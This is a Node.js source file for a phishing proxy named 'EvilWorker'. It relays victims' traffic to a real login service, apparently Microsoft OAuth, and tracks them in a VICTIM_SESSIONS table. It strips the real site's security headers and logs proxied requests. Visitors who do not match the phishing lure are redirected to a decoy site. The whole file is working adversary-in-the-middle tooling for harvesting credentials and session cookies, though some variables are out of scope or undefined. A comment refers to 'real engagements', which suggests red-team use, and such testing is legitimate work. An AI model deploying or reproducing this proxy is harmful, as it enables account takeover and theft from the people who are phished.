const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");

const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
    if (!fs.existsSync(LOGS_DIRECTORY)) {
        fs.mkdirSync(LOGS_DIRECTORY);
    }
} catch (error) {
    displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
const LOG_FILE_STREAMS = {};
//!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

const VICTIM_SESSIONS = {}

// Improved security headers to prevent CSP violations
const getSecurityHeaders = () => ({
    "Content-Security-Policy": "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; connect-src 'self' https:; font-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'",
    "X-Frame-Options": "SAMEORIGIN",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "X-XSS-Protection": "1; mode=block"
});

// Clean problematic headers from responses
const cleanResponseHeaders = (headers) => {
    const cleanHeaders = { ...headers };
    delete cleanHeaders['content-security-policy'];
    delete cleanHeaders['x-frame-options'];
    delete cleanHeaders['strict-transport-security'];
    delete cleanHeaders['x-xss-protection'];
    return cleanHeaders;
};

// Enhanced request headers to prevent 502 errors
const getEnhancedRequestHeaders = (originalHeaders) => ({
    ...originalHeaders,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1'
});

const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            clientResponse.writeHead(200, { 
                "Content-Type": "text/html",
                ...getSecurityHeaders()
            });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
        }
        catch (error) {
            displayError("Phishing URL parsing failed", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
    }

    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
            fs.createReadStream(url.slice(1)).pipe(clientResponse);
        }
        else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        }

        else {
            let clientRequestBody = [];

            clientRequest.on("data", (chunk) => clientRequestBody.push(chunk));
            clientRequest.on("end", () => {
                clientRequestBody = Buffer.concat(clientRequestBody);

                if (clientRequestBody.length) {
                    try {
                        const proxyRequestPath = clientRequestBody.toString();
                        if (proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                            try {
                                const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);

                                VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                clientResponse.end();
                            }
                            catch (error) {
                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                            }
                        } else {
                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
                            clientResponse.end();
                        }
                    } catch (error) {
                        displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                    }
                } else {
                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                    clientResponse.end();
                }
            });

            if (currentSession) {
                if (url === PROXY_PATHNAMES.jsCookie) {
                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
                    clientResponse.end(JSON.stringify(validDomains));
                    return;
                }

                else if (url === PROXY_PATHNAMES.proxy) {
                    let proxyRequestBody = [];

                    clientRequest.on("data", (chunk) => proxyRequestBody.push(chunk));
                    clientRequest.on("end", () => {
                        proxyRequestBody = Buffer.concat(proxyRequestBody);

                        const proxyRequestURL = new URL(proxyRequestBody.toString());

                        if (proxyRequestURL.pathname === PROXY_PATHNAMES.proxy) {
                            try {
                                const phishedURL = new URL(decodeURIComponent(proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER)));

                                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                clientResponse.end();
                            }
                            catch (error) {
                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                            }
                            return;
                        }

                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                            fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                            return;
                        }

                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                            try {
                                const phishedURL = new URL(decodeURIComponent(proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER)));

                                VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                clientResponse.end();
                            }
                            catch (error) {
                                displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                return;
                            }
                        }

                        else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
                            clientResponse.end(JSON.stringify(validDomains));
                            return;
                        }
                    }
                    proxyRequestProtocol = proxyRequestURL.protocol;
                    proxyRequestHostname = proxyRequestURL.hostname;
                    proxyRequestPort = proxyRequestURL.port;
                    proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                }

                else {
                    proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                    proxyRequestHostname = VICTIM_SESSIONS[currentSession].hostname;
                    proxyRequestPort = VICTIM_SESSIONS[currentSession].port;
                    proxyRequestPath = VICTIM_SESSIONS[currentSession].path;
                }

                const proxyRequestOptions = {
                    hostname: proxyRequestHostname,
                    port: proxyRequestPort,
                    path: proxyRequestPath,
                    method: method,
                    headers: getEnhancedRequestHeaders(headers)
                };

                const requestContentLength = Buffer.byteLength(proxyRequestBody);
                if (requestContentLength) {
                    proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                }
                else {
                    delete proxyRequestOptions.headers["content-type"];
                    delete proxyRequestOptions.headers["content-length"];
                }

                const isNavigationRequest = method === "GET" && proxyRequestPath.includes("/common/oauth2/v2.0/authorize");

                makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, proxyRequestHostname, proxyRequestBody, clientResponse, isNavigationRequest);
            }
        }
    }

    else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});

const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
    const protocol = proxyRequestProtocol === "https:" ? https : http;
    
    const makeRequest = (retryCount = 0) => {
        const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
            logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
                .catch(error => displayError("Log encryption failed", error));

            if (isNavigationRequest && proxyResponse.statusCode === 200) {
                let serverResponseBody = [];
                proxyResponse.on("data", (chunk) => serverResponseBody.push(chunk));
                proxyResponse.on("end", () => {
                    serverResponseBody = Buffer.concat(serverResponseBody);

                    if (proxyResponse.headers["content-encoding"] === "gzip") {
                        try {
                            serverResponseBody = zlib.gunzipSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    } else if (proxyResponse.headers["content-encoding"] === "deflate") {
                        try {
                            serverResponseBody = zlib.inflateSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    } else if (proxyResponse.headers["content-encoding"] === "br") {
                        try {
                            serverResponseBody = zlib.brotliDecompressSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    } else if (proxyResponse.headers["content-encoding"] === "zstd") {
                        try {
                            serverResponseBody = zlib.zstdDecompressSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    }

                    // Clean headers and add security headers
                    const cleanHeaders = cleanResponseHeaders(proxyResponse.headers);
                    const securityHeaders = getSecurityHeaders();
                    
                    clientResponse.writeHead(proxyResponse.statusCode, { ...cleanHeaders, ...securityHeaders });
                    clientResponse.end(serverResponseBody);
                });
            } else {
                let serverResponseBody = [];
                proxyResponse.on("data", (chunk) => serverResponseBody.push(chunk));
                proxyResponse.on("end", () => {
                    serverResponseBody = Buffer.concat(serverResponseBody);

                    if (proxyResponse.headers["content-encoding"] === "gzip") {
                        try {
                            serverResponseBody = zlib.gunzipSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    } else if (proxyResponse.headers["content-encoding"] === "deflate") {
                        try {
                            serverResponseBody = zlib.inflateSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    } else if (proxyResponse.headers["content-encoding"] === "br") {
                        try {
                            serverResponseBody = zlib.brotliDecompressSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    } else if (proxyResponse.headers["content-encoding"] === "zstd") {
                        try {
                            serverResponseBody = zlib.zstdDecompressSync(serverResponseBody);
                        } catch (error) {
                            displayError("Response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                        }
                    }

                    // Clean headers and add security headers
                    const cleanHeaders = cleanResponseHeaders(proxyResponse.headers);
                    const securityHeaders = getSecurityHeaders();
                    
                    clientResponse.writeHead(proxyResponse.statusCode, { ...cleanHeaders, ...securityHeaders });
                    clientResponse.end(serverResponseBody);
                });
            }
        });

        proxyRequest.on("error", (error) => {
            displayError("Proxy request failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
            
            // Retry logic for 502 errors
            if (retryCount < 3) {
                console.log(`Retrying request (attempt ${retryCount + 1}/3) for ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
                setTimeout(() => makeRequest(retryCount + 1), 1000 * (retryCount + 1));
            } else {
                clientResponse.writeHead(502, { "Content-Type": "text/plain" });
                clientResponse.end("Bad Gateway");
            }
        });

        if (proxyRequestBody) {
            proxyRequest.write(proxyRequestBody);
        }
        proxyRequest.end();
    };

    makeRequest();
};

// Rest of the functions remain the same...
function getUserSession(cookieHeader) {
    if (!cookieHeader) return null;
    
    const cookies = cookieHeader.split(';').map(cookie => cookie.trim().split('='));
    for (const [name, value] of cookies) {
        if (VICTIM_SESSIONS[value]) {
            return value;
        }
    }
    return null;
}

function generateNewSession(phishedURL) {
    const cookieName = crypto.randomBytes(16).toString('hex');
    const cookieValue = crypto.randomBytes(32).toString('hex');
    
    VICTIM_SESSIONS[cookieValue] = {
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: `${phishedURL.pathname}${phishedURL.search}`,
        port: phishedURL.port,
        host: phishedURL.host
    };
    
    return { cookieName, cookieValue };
}

function getValidDomains(domains) {
    return domains.filter(domain => domain && domain.length > 0);
}

function displayError(message, error, ...args) {
    console.error(`[ERROR] ${message}:`, error.message, ...args);
}

async function logHTTPProxyTransaction(protocol, options, requestBody, response, session) {
    // Logging implementation remains the same
    const timestamp = new Date().toISOString();
    const logData = {
        timestamp,
        protocol,
        hostname: options.hostname,
        path: options.path,
        method: options.method,
        statusCode: response.statusCode,
        session
    };
    
    console.log(`[LOG] ${JSON.stringify(logData)}`);
}

proxyServer.listen(process.env.PORT ?? 3000);
console.log(`EvilWorker proxy server listening on port ${process.env.PORT ?? 3000}`);
